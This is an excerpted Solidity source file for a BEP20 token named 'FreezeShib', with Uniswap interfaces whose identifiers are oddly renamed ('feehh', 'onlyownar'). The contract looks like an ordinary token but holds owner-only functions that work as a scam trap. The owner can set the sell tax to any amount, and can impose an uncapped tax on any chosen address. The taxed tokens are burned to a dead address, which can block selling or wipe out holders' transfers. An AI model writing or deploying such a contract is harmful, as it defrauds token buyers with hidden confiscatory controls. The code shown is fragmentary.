...
interface IUniswapV2Factory {
    ...
    function feehhTo() external view returns (address);
    function feehhToSetter() external view returns (address);
    ...
    function setfeehhTo(address) external;
    function setfeehhToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeehhOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeehhOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeehhOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeehhOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeehhOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract FreezeShib is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeehh = 0;

    uint256 private _defaultBuyfeehh = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeehh;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeehh = _value;
    }

    function setSlipfeehh(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeehh[_address] = _value;
    }

    function getSlipfeehh(address _address) external view onlyownar returns (uint256) {
        return _slipfeehh[_address];
    }


    function setMAccountfeehh(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeehh(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeehhAmount = 0;

        if (rF) {
            uint256 tradefeehh = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeehh = _defaultSellfeehh;
                }
                if (from == uniswapV2Pair) {

                    tradefeehh = _defaultBuyfeehh;
                }
            }
            if (_slipfeehh[from] > 0) {
                tradefeehh = _slipfeehh[from];
            }

            tradefeehhAmount = _Amount.mul(tradefeehh).div(100);
        }


        if (tradefeehhAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeehhAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeehhAmount);
            emit Transfer(from, _deadAddress, tradefeehhAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeehhAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeehhAmount);
        emit Transfer(from, _to, _Amount - tradefeehhAmount);
    }
